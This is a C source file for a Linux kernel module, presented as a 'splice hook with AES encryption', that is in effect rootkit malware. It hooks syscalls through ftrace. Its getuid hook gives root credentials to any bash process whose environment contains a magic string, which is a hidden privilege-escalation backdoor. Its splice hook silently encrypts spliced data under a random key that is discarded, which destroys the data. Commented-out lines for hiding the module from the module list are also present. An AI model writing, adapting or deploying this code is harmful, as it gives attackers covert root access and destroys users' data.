/*

Copyright (c) 2025 nullpointer(malefax)
Just a slave of God

*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/crypto.h>
#include <linux/scatterlist.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/random.h>
#include <linux/mutex.h>
#include <crypto/skcipher.h>
#include "secure.h"

// Version-specific adjustments
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
#define FTRACE_REGS_STRUCT ftrace_regs
#else
#define FTRACE_REGS_STRUCT pt_regs
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long retval;

    if (register_kprobe(&kp) < 0) return 0;
    retval = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return retval;
}
#else
static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

DEFINE_MUTEX(enc_lock);
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16 
#define MAX_ENCRYPT_SIZE (1024 * 1024)  // 1MB limit
static struct crypto_skcipher *tfm = NULL;
static u8 aes_key[AES_KEY_SIZE];
                                        

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to resolve %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long*)hook->original) = hook->address;
    return 0;
}

// Updated function signature to use FTRACE_REGS_STRUCT
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct FTRACE_REGS_STRUCT *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
        regs->regs.ip = (unsigned long)hook->function;
#else
        regs->ip = (unsigned long)hook->function;
#endif
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                   | FTRACE_OPS_FL_RECURSION
                   | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_ERR "unregister_ftrace_function failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk(KERN_ERR "ftrace_set_filter_ip failed: %d\n", err);
}
/*Remember check kernel lockdown mode otherwise wont work*/
static void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}




typedef asmlinkage long (*orig_getuid_t)(const struct pt_regs *);
static  orig_getuid_t orig_getuid;
DECL_FUNC_CHECK(orig_getuid,SIG_GET_PID);

static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    const char *name = current->comm;

    struct mm_struct *mm;
    char *envs;
    int len, i;

    if (strcmp(name, "bash") == 0) {
        mm = current->mm;
        if (mm && mm->env_start && mm->env_end) {
            envs = kmalloc(PAGE_SIZE, GFP_ATOMIC);
            if (envs) {
                len = access_process_vm(current, mm->env_start, envs, PAGE_SIZE - 1, 0);
                if (len > 0) {
                    for (i = 0; i < len - 1; i++) {
                        if (envs[i] == '\0')
                            envs[i] = ' ';
                    }
                    if (strstr(envs, "MAGIC=megatron")) {
                        rootmagic();
                    }
                }
                kfree(envs);
            }
        }
    }
    return orig_getuid(regs);
}

static void generate_random_key(void) {
    get_random_bytes(aes_key, AES_KEY_SIZE);
}

static int aes_encrypt_buffer(u8 *plaintext, u8 *ciphertext, size_t len, u8 *iv) {
    struct skcipher_request *req;
    struct scatterlist sg_in, sg_out;
    int ret;

    if (!tfm) {
        return -EINVAL;
    }        

    if (len == 0 || len > MAX_ENCRYPT_SIZE) {
        return -EINVAL;
    }

    req = skcipher_request_alloc(tfm, GFP_KERNEL);
    if (!req) {
        return -ENOMEM;
    }


    sg_init_one(&sg_in, plaintext, len);
    sg_init_one(&sg_out, ciphertext, len);

    skcipher_request_set_tfm(req, tfm);
    skcipher_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG, NULL, NULL);
    skcipher_request_set_crypt(req, &sg_in, &sg_out, len, iv);

    mutex_lock(&enc_lock);
    ret = crypto_skcipher_encrypt(req);
    mutex_unlock(&enc_lock);

    skcipher_request_free(req);
    return ret;
}

static struct file* get_file_from_fd(int fd) {
    struct file *file;

    if (fd < 0) {
        return ERR_PTR(-EBADF);
    }

    file = fget(fd);
    if (!file) {
        return ERR_PTR(-EBADF);
    }

    return file;
}
typedef asmlinkage long (*orig_splice_t)(const struct pt_regs *);
static orig_splice_t orig_splice;
DECL_FUNC_CHECK(orig_splice,SIG_SPLICE);

static long hook_splice(const struct pt_regs *regs)
{
    int fd_in, fd_out;
    loff_t *off_in_ptr, *off_out_ptr;
    size_t len;
    struct file *file_in = NULL;
    struct file *file_out = NULL;
    loff_t off_in = 0, off_out = 0;
    ssize_t bytes_read, bytes_written;
    u8 *plaintext_buf = NULL, *ciphertext_buf = NULL, *iv = NULL;
    long ret = 0;

    size_t padded_len;
    int blocksize;
    
    fd_in = (int)regs->di;
    off_in_ptr = (loff_t *)regs->si;
    fd_out = (int)regs->dx;
    off_out_ptr = (loff_t *)regs->r10;
    len = (size_t)regs->r8;

    printk(KERN_INFO "splice_enc: hook called fd_in=%d fd_out=%d len=%zu\n", fd_in, fd_out, len);

    if (!tfm || !orig_splice) { // FIXED: ensure tfm is initialized
        pr_err("Missing crypto context or original syscall\n");
        return -EFAULT;
    }

    if (len == 0 || len > MAX_ENCRYPT_SIZE) {
        printk(KERN_INFO "splice_enc: len check failed, using original\n");
        return (len == 0) ? 0 : orig_splice(regs);
    }

    file_in = get_file_from_fd(fd_in);
    if (IS_ERR(file_in)) {
        printk(KERN_INFO "splice_enc: failed to get input file, using original\n");
        return orig_splice(regs);
    }

    file_out = get_file_from_fd(fd_out);
    if (IS_ERR(file_out)) {
        fput(file_in);
        printk(KERN_INFO "splice_enc: failed to get output file, using original\n");
        return orig_splice(regs);
    }

    if (!S_ISREG(file_inode(file_in)->i_mode)) {
        printk(KERN_INFO "splice_enc: input not regular file, using original\n");
        fput(file_in);
        fput(file_out);
        return orig_splice(regs);
    }

    if (off_in_ptr) {
        if (copy_from_user(&off_in, off_in_ptr, sizeof(loff_t))) {
            ret = -EFAULT;
            goto cleanup;
        }
    } else {
        off_in = file_in->f_pos;
    }

    if (off_out_ptr) {
        if (copy_from_user(&off_out, off_out_ptr, sizeof(loff_t))) {
            ret = -EFAULT;
            goto cleanup;
        }
    } else {
        off_out = file_out->f_pos;
    }

    plaintext_buf = kzalloc(len, GFP_KERNEL);
    if (!plaintext_buf) {
        ret = -ENOMEM;
        goto cleanup;
    }

bytes_read = kernel_read(file_in, plaintext_buf, len, &off_in);
if (bytes_read <= 0) {
    ret = bytes_read;
    goto cleanup;
}
blocksize = crypto_skcipher_blocksize(tfm); 
padded_len = ALIGN(bytes_read, blocksize);

   if (padded_len > len) {
        printk(KERN_INFO "splice_enc: padding %zu extra bytes\n", padded_len - bytes_read);
    }
    memset(plaintext_buf + bytes_read, 0, padded_len - bytes_read);

    ciphertext_buf = kzalloc(padded_len + AES_IV_SIZE, GFP_KERNEL);
    iv = kzalloc(AES_IV_SIZE, GFP_KERNEL);
    if (!ciphertext_buf || !iv) {
        ret = -ENOMEM;
        goto cleanup;
    }

     get_random_bytes(iv, AES_IV_SIZE); 

    ret = aes_encrypt_buffer(plaintext_buf, ciphertext_buf + AES_IV_SIZE, padded_len, iv);
    if (ret < 0) {
        printk(KERN_ERR "splice_enc: encryption failed, ret=%ld\n", ret);
    }

    memcpy(ciphertext_buf, iv, AES_IV_SIZE);

    bytes_written = kernel_write(file_out, ciphertext_buf, padded_len + AES_IV_SIZE, &off_out);
    if (bytes_written < 0) {
        ret = bytes_written;
        goto cleanup;
    }

    if (!off_in_ptr)
        file_in->f_pos = off_in;
    if (!off_out_ptr)
        file_out->f_pos = off_out;

    if (off_in_ptr)
        if (copy_to_user(off_in_ptr, &off_in, sizeof(loff_t)))
              printk(KERN_WARNING "splice_enc: failed to copy to off_in_ptr\n");

    if (off_out_ptr)
        if (copy_to_user(off_out_ptr, &off_out, sizeof(loff_t)))
                printk(KERN_WARNING "splice_enc: failed to copy to off_in_ptr\n");



    printk(KERN_INFO "splice_enc: success, read=%zd padded=%zu written=%zd\n",
           bytes_read, padded_len, bytes_written);

    ret = bytes_written;

cleanup:
    if (plaintext_buf) {
        memzero_explicit(plaintext_buf, len);
        kfree(plaintext_buf);
    }
    if (ciphertext_buf)
        kfree(ciphertext_buf);
    if (iv) {
        memzero_explicit(iv, AES_IV_SIZE);
        kfree(iv);
    }

    fput(file_in);
    fput(file_out);
    return ret;
}



static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
    HOOK("__x64_sys_splice", hook_splice, &orig_splice),
};


static int __init splice_enc_init(void)
{
    int err;
    size_t i;

    generate_random_key();

    tfm = crypto_alloc_skcipher("cbc(aes)", 0, 0);
    if (IS_ERR(tfm)) {
        return PTR_ERR(tfm);
    }

    err = crypto_skcipher_setkey(tfm, aes_key, AES_KEY_SIZE);
    if (err) {
        crypto_free_skcipher(tfm);
        return err;
    }

    // Do kernel module hiding
//    list_del_init(&__this_module.list);
//    kobject_del(&THIS_MODULE->mkobj.kobj);

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

  
    return 0;

error:
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }

    if (tfm) {
        crypto_free_skcipher(tfm);
    }

    return err;
}

static void __exit splice_enc_exit(void)
{
    size_t i;

    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove_hook(&hooks[i]);

    if (tfm) {
        crypto_free_skcipher(tfm);
    }

    memzero_explicit(aes_key, AES_KEY_SIZE);

}

module_init(splice_enc_init);
module_exit(splice_enc_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("splice hook with  AES encryption");
MODULE_AUTHOR("malefax");

